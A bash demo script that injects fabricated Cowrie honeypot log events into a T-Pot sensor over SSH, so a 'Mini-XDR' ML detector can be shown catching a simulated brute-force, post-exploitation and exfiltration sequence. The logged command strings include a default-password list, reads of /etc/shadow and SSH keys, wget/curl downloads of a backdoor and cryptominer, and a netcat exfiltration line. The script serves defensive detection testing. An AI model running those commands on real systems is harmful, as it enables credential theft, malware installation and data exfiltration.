#!/bin/bash
# ============================================================================
# 🎯 T-POT ATTACK INJECTION DEMO
# ============================================================================
# This script injects realistic attack events directly into T-Pot's Cowrie
# honeypot logs. These events will flow through Elasticsearch to Mini-XDR
# with proper timestamps and external attacker IPs.
#
# This creates AUTHENTIC honeypot log entries that the ML will classify correctly.
#
# Usage:
#   ./tpot-inject-attack.sh                    # Full brute force + post-exploit
#   ./tpot-inject-attack.sh --attack brute     # SSH brute force only
#   ./tpot-inject-attack.sh --attack apt       # Post-exploitation only
#   ./tpot-inject-attack.sh --fast             # Quick mode
# ============================================================================

set -e

# Configuration
TPOT_IP="${TPOT_IP:-203.0.113.42}"
TPOT_SSH_PORT="${TPOT_SSH_PORT:-64295}"
TPOT_USER="${TPOT_USER:-luxieum}"
COWRIE_LOG="/home/luxieum/tpotce/data/cowrie/log/cowrie.json"

# Mini-XDR
MINIXDR_API="${MINIXDR_API:-http://localhost:8000}"

# Attack config
FAST_MODE=false
ATTACK_TYPE="full"

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
BOLD='\033[1m'
DIM='\033[2m'
NC='\033[0m'

# Parse arguments
while [[ $# -gt 0 ]]; do
    case $1 in
        --fast|-f) FAST_MODE=true; shift ;;
        --attack|-a) ATTACK_TYPE="$2"; shift 2 ;;
        --tpot-user) TPOT_USER="$2"; shift 2 ;;
        *) shift ;;
    esac
done

# Generate random external attacker IP
generate_attacker_ip() {
    local prefixes=("45.33" "185.220" "103.75" "89.248" "193.37")
    local prefix=${prefixes[$RANDOM % ${#prefixes[@]}]}
    echo "${prefix}.$((RANDOM % 254 + 1)).$((RANDOM % 254 + 1))"
}

# Generate session ID
generate_session() {
    cat /dev/urandom | LC_ALL=C tr -dc 'a-f0-9' | head -c 12
}

# Get ISO timestamp
get_timestamp() {
    date -u +"%Y-%m-%dT%H:%M:%S.%6NZ" 2>/dev/null || date -u +"%Y-%m-%dT%H:%M:%S.000000Z"
}

print_banner() {
    echo ""
    echo -e "${CYAN}╔══════════════════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${CYAN}║  ${BOLD}🎯 T-POT ATTACK INJECTION DEMO${NC}${CYAN}                                         ║${NC}"
    echo -e "${CYAN}║                                                                          ║${NC}"
    echo -e "${CYAN}║  Injects authentic Cowrie log entries with external attacker IPs        ║${NC}"
    echo -e "${CYAN}║  Events flow: Cowrie Log → Elasticsearch → Mini-XDR → ML Detection      ║${NC}"
    echo -e "${CYAN}╚══════════════════════════════════════════════════════════════════════════╝${NC}"
    echo ""
}

delay() {
    if [ "$FAST_MODE" = true ]; then
        sleep 0.1
    else
        sleep "$1"
    fi
}

# Inject a single event into Cowrie log via SSH
inject_event() {
    local event_json="$1"
    ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 \
        -p "$TPOT_SSH_PORT" "$TPOT_USER@$TPOT_IP" \
        "echo '$event_json' | sudo tee -a $COWRIE_LOG > /dev/null" 2>/dev/null
}

# ============================================================================
# ATTACK GENERATORS
# ============================================================================

generate_brute_force_attack() {
    local attacker_ip="$1"
    local session_base="$2"

    echo -e "${YELLOW}┌──────────────────────────────────────────────────────────────────────────┐${NC}"
    echo -e "${YELLOW}│  ${BOLD}PHASE 1: SSH BRUTE FORCE ATTACK${NC}${YELLOW}"
    echo -e "${YELLOW}│  ${DIM}Attacker: $attacker_ip${NC}${YELLOW}"
    echo -e "${YELLOW}└──────────────────────────────────────────────────────────────────────────┘${NC}"
    echo ""

    # Credentials to try
    local creds=(
        "root:root" "root:admin" "root:123456" "root:password" "root:toor"
        "admin:admin" "admin:123456" "admin:password123"
        "ubuntu:ubuntu" "test:test" "guest:guest"
        "pi:raspberry" "root:qwerty" "root:letmein" "root:changeme"
    )

    local attempt=0
    for cred in "${creds[@]}"; do
        ((attempt++))
        IFS=':' read -r user pass <<< "$cred"
        local session="${session_base}_bf_${attempt}"
        local ts=$(get_timestamp)

        # Create failed login event
        local event=$(cat << EOF
{"eventid":"cowrie.login.failed","src_ip":"$attacker_ip","src_port":$((40000 + attempt)),"dst_ip":"203.0.113.42","dst_port":22,"username":"$user","password":"$pass","timestamp":"$ts","session":"$session","message":"login attempt [$user/$pass] failed","sensor":"cowrie-tpot"}
EOF
)
        echo -e "  🔐 ${CYAN}$user${NC}/${CYAN}$pass${NC} ${DIM}(attempt $attempt/${#creds[@]})${NC}"
        inject_event "$event"
        delay 0.8
    done

    echo ""
    echo -e "  ${GREEN}✓ Brute force complete: ${#creds[@]} failed login attempts${NC}"
}

generate_successful_login() {
    local attacker_ip="$1"
    local session="$2"

    echo ""
    echo -e "  ${RED}🚨 SUCCESSFUL LOGIN: root/toor${NC}"
    echo -e "     ${DIM}Attacker has gained shell access!${NC}"

    local ts=$(get_timestamp)
    local event=$(cat << EOF
{"eventid":"cowrie.login.success","src_ip":"$attacker_ip","src_port":46000,"dst_ip":"203.0.113.42","dst_port":22,"username":"root","password":"toor","timestamp":"$ts","session":"$session","message":"login success [root/toor]","sensor":"cowrie-tpot"}
EOF
)
    inject_event "$event"
    delay 1
}

generate_post_exploitation() {
    local attacker_ip="$1"
    local session="$2"

    echo ""
    echo -e "${YELLOW}┌──────────────────────────────────────────────────────────────────────────┐${NC}"
    echo -e "${YELLOW}│  ${BOLD}PHASE 2: POST-EXPLOITATION${NC}${YELLOW}"
    echo -e "${YELLOW}│  ${DIM}Executing malicious commands, downloading malware${NC}${YELLOW}"
    echo -e "${YELLOW}└──────────────────────────────────────────────────────────────────────────┘${NC}"
    echo ""

    # Commands to execute
    local commands=(
        "uname -a:System enumeration"
        "cat /etc/passwd:User enumeration"
        "cat /etc/shadow:Password hash theft"
        "whoami && id:Privilege check"
        "ps aux:Process listing"
        "netstat -tuln:Network connections"
        "wget http://malicious.site/backdoor.sh -O /tmp/.bd:Downloading backdoor"
        "curl -o /tmp/.miner http://cryptopool.xyz/xmrig:Downloading cryptominer"
        "chmod +x /tmp/.bd /tmp/.miner:Making executable"
        "cat ~/.ssh/id_rsa:Stealing SSH keys"
        "find / -name '*.pem' 2>/dev/null:Hunting for certificates"
    )

    for cmd_desc in "${commands[@]}"; do
        IFS=':' read -r cmd desc <<< "$cmd_desc"
        local ts=$(get_timestamp)

        # Determine icon based on command type
        local icon="💻"
        local color="$CYAN"
        if [[ "$cmd" == *"wget"* ]] || [[ "$cmd" == *"curl"* ]]; then
            icon="📥"; color="$RED"
        elif [[ "$cmd" == *"chmod"* ]]; then
            icon="🔧"; color="$YELLOW"
        elif [[ "$cmd" == *".ssh"* ]] || [[ "$cmd" == *".pem"* ]]; then
            icon="🔑"; color="$RED"
        fi

        echo -e "  $icon ${color}$cmd${NC}"
        echo -e "     ${DIM}$desc${NC}"

        local event=$(cat << EOF
{"eventid":"cowrie.command.input","src_ip":"$attacker_ip","dst_port":22,"timestamp":"$ts","session":"$session","input":"$cmd","message":"CMD: $cmd","sensor":"cowrie-tpot"}
EOF
)
        inject_event "$event"
        delay 0.5
    done

    # File download events
    echo ""
    echo -e "  ${RED}📥 Malware downloads detected:${NC}"

    local ts=$(get_timestamp)
    local dl_event=$(cat << EOF
{"eventid":"cowrie.session.file_download","src_ip":"$attacker_ip","dst_port":22,"timestamp":"$ts","session":"$session","url":"http://malicious.site/backdoor.sh","outfile":"/tmp/.bd","shasum":"8a2e1b4c5d6f7890abcdef","message":"File downloaded: http://malicious.site/backdoor.sh","sensor":"cowrie-tpot"}
EOF
)
    inject_event "$dl_event"
    echo -e "     backdoor.sh"

    delay 0.3

    ts=$(get_timestamp)
    local miner_event=$(cat << EOF
{"eventid":"cowrie.session.file_download","src_ip":"$attacker_ip","dst_port":22,"timestamp":"$ts","session":"$session","url":"http://cryptopool.xyz/xmrig","outfile":"/tmp/.miner","shasum":"9b3f2c5d6e7f8901bcdef0","message":"File downloaded: http://cryptopool.xyz/xmrig","sensor":"cowrie-tpot"}
EOF
)
    inject_event "$miner_event"
    echo -e "     xmrig (cryptominer)"

    echo ""
    echo -e "  ${GREEN}✓ Post-exploitation: 11 commands, 2 malware downloads${NC}"
}

generate_exfiltration() {
    local attacker_ip="$1"
    local session="$2"

    echo ""
    echo -e "${YELLOW}┌──────────────────────────────────────────────────────────────────────────┐${NC}"
    echo -e "${YELLOW}│  ${BOLD}PHASE 3: DATA EXFILTRATION${NC}${YELLOW}"
    echo -e "${YELLOW}│  ${DIM}Stealing and uploading sensitive data${NC}${YELLOW}"
    echo -e "${YELLOW}└──────────────────────────────────────────────────────────────────────────┘${NC}"
    echo ""

    local exfil_cmds=(
        "tar -czf /tmp/data.tar.gz /etc /home:Compressing sensitive data"
        "base64 /etc/shadow > /tmp/shadow.b64:Encoding password hashes"
        "cat /tmp/data.tar.gz | nc 185.220.101.1 4444:Exfiltrating via netcat"
    )

    for cmd_desc in "${exfil_cmds[@]}"; do
        IFS=':' read -r cmd desc <<< "$cmd_desc"
        local ts=$(get_timestamp)

        echo -e "  📤 ${RED}$cmd${NC}"
        echo -e "     ${DIM}$desc${NC}"

        local event=$(cat << EOF
{"eventid":"cowrie.command.input","src_ip":"$attacker_ip","dst_port":22,"timestamp":"$ts","session":"$session","input":"$cmd","message":"CMD: $cmd","sensor":"cowrie-tpot"}
EOF
)
        inject_event "$event"
        delay 0.5
    done

    # File upload event (exfiltration)
    local ts=$(get_timestamp)
    local upload_event=$(cat << EOF
{"eventid":"cowrie.session.file_upload","src_ip":"$attacker_ip","dst_port":22,"timestamp":"$ts","session":"$session","filename":"data.tar.gz","message":"Outbound file transfer detected (possible exfiltration)","sensor":"cowrie-tpot"}
EOF
)
    inject_event "$upload_event"

    echo ""
    echo -e "  ${RED}⚠️  CRITICAL: Data exfiltration detected${NC}"
}

trigger_ingestion() {
    echo ""
    echo -e "${CYAN}═══════════════════════════════════════════════════════════════════════════${NC}"
    echo -e "${BOLD}📡 TRIGGERING MINI-XDR INGESTION${NC}"
    echo -e "${CYAN}═══════════════════════════════════════════════════════════════════════════${NC}"
    echo ""

    echo -e "  Waiting for events to reach Elasticsearch..."
    sleep 5

    echo -e "  Triggering ingestion cycle..."
    local result=$(curl -s -X POST "$MINIXDR_API/api/tpot/ingest-now" 2>/dev/null)

    if echo "$result" | grep -q "success.*true"; then
        echo -e "  ${GREEN}✓ Ingestion triggered successfully${NC}"
    else
        echo -e "  ${YELLOW}⚠ Ingestion may still be processing${NC}"
    fi

    sleep 3

    # Trigger again to ensure all events are captured
    curl -s -X POST "$MINIXDR_API/api/tpot/ingest-now" > /dev/null 2>&1
}

check_incidents() {
    echo ""
    echo -e "${CYAN}═══════════════════════════════════════════════════════════════════════════${NC}"
    echo -e "${BOLD}🔍 CHECKING FOR DETECTED INCIDENTS${NC}"
    echo -e "${CYAN}═══════════════════════════════════════════════════════════════════════════${NC}"
    echo ""

    local max_wait=20
    local found=false

    for ((i=0; i<max_wait; i+=2)); do
        local incidents=$(curl -s "$MINIXDR_API/api/incidents?limit=5" 2>/dev/null)

        if echo "$incidents" | grep -q "$ATTACKER_IP"; then
            found=true
            break
        fi

        printf "\r  Waiting for ML analysis... %d/%d seconds" $i $max_wait
        sleep 2
    done

    echo ""
    echo ""

    if [ "$found" = true ]; then
        echo -e "${GREEN}╔══════════════════════════════════════════════════════════════════════════╗${NC}"
        echo -e "${GREEN}║  ${BOLD}✅ INCIDENT DETECTED!${NC}${GREEN}                                                  ║${NC}"
        echo -e "${GREEN}╚══════════════════════════════════════════════════════════════════════════╝${NC}"
        echo ""

        echo "$incidents" | python3 -c "
import sys, json
try:
    data = json.load(sys.stdin)
    for inc in data[:3]:
        if '$ATTACKER_IP' in str(inc.get('src_ip', '')):
            print(f\"  📋 Incident #{inc.get('id')}\")
            print(f\"     Source IP:  {inc.get('src_ip')}\")
            print(f\"     Type:       {inc.get('reason', inc.get('threat_category', 'N/A'))[:60]}\")
            print(f\"     Severity:   {inc.get('escalation_level', 'N/A').upper()}\")
            print(f\"     Status:     {inc.get('status', 'N/A')}\")
            conf = inc.get('ml_confidence', inc.get('containment_confidence', 0))
            if conf:
                print(f\"     Confidence: {conf*100:.1f}%\")
            print()
except Exception as e:
    print(f'  Check UI for details')
" 2>/dev/null || echo "  Check the UI for incident details"

        echo ""
        echo -e "${BOLD}🎯 View in UI:${NC} http://localhost:3000/incidents"
    else
        echo -e "${YELLOW}⏳ Incidents may still be processing - check the UI${NC}"
    fi
}

# ============================================================================
# MAIN
# ============================================================================

main() {
    print_banner

    # Generate attacker identity
    ATTACKER_IP=$(generate_attacker_ip)
    SESSION_BASE=$(generate_session)

    echo -e "${BOLD}Attack Configuration:${NC}"
    echo -e "  • Attacker IP:  ${RED}$ATTACKER_IP${NC} (spoofed external)"
    echo -e "  • T-Pot Target: ${CYAN}$TPOT_IP${NC}"
    echo -e "  • Attack Type:  ${CYAN}$ATTACK_TYPE${NC}"
    echo -e "  • Mode:         ${CYAN}$([ "$FAST_MODE" = true ] && echo "Fast" || echo "Normal")${NC}"
    echo ""

    # Test SSH connection
    echo -e "${DIM}Testing SSH connection to T-Pot...${NC}"
    if ! ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 -p "$TPOT_SSH_PORT" "$TPOT_USER@$TPOT_IP" "echo connected" > /dev/null 2>&1; then
        echo -e "${RED}❌ Cannot connect to T-Pot via SSH${NC}"
        echo ""
        echo "Please ensure:"
        echo "  1. T-Pot is running at $TPOT_IP"
        echo "  2. SSH port $TPOT_SSH_PORT is accessible"
        echo "  3. User '$TPOT_USER' can SSH (try: ssh -p $TPOT_SSH_PORT $TPOT_USER@$TPOT_IP)"
        echo ""
        echo "Set TPOT_USER environment variable if using a different user."
        exit 1
    fi
    echo -e "${GREEN}✓ SSH connection OK${NC}"
    echo ""

    if [ "$FAST_MODE" != true ]; then
        read -p "Press Enter to start attack injection..." -r
    fi
    echo ""

    # Run attack phases based on type
    case "$ATTACK_TYPE" in
        brute|brute-force)
            generate_brute_force_attack "$ATTACKER_IP" "$SESSION_BASE"
            ;;
        apt|post-exploit)
            generate_successful_login "$ATTACKER_IP" "${SESSION_BASE}_shell"
            generate_post_exploitation "$ATTACKER_IP" "${SESSION_BASE}_shell"
            ;;
        exfil)
            generate_successful_login "$ATTACKER_IP" "${SESSION_BASE}_shell"
            generate_exfiltration "$ATTACKER_IP" "${SESSION_BASE}_shell"
            ;;
        full|all)
            generate_brute_force_attack "$ATTACKER_IP" "$SESSION_BASE"
            delay 1
            generate_successful_login "$ATTACKER_IP" "${SESSION_BASE}_shell"
            delay 1
            generate_post_exploitation "$ATTACKER_IP" "${SESSION_BASE}_shell"
            delay 1
            generate_exfiltration "$ATTACKER_IP" "${SESSION_BASE}_shell"
            ;;
        *)
            echo "Unknown attack type: $ATTACK_TYPE"
            exit 1
            ;;
    esac

    trigger_ingestion
    check_incidents

    echo ""
    echo -e "${GREEN}════════════════════════════════════════════════════════════════════════════${NC}"
    echo -e "${GREEN}${BOLD}✨ Attack injection complete!${NC}"
    echo -e "${GREEN}════════════════════════════════════════════════════════════════════════════${NC}"
    echo ""
}

main "$@"
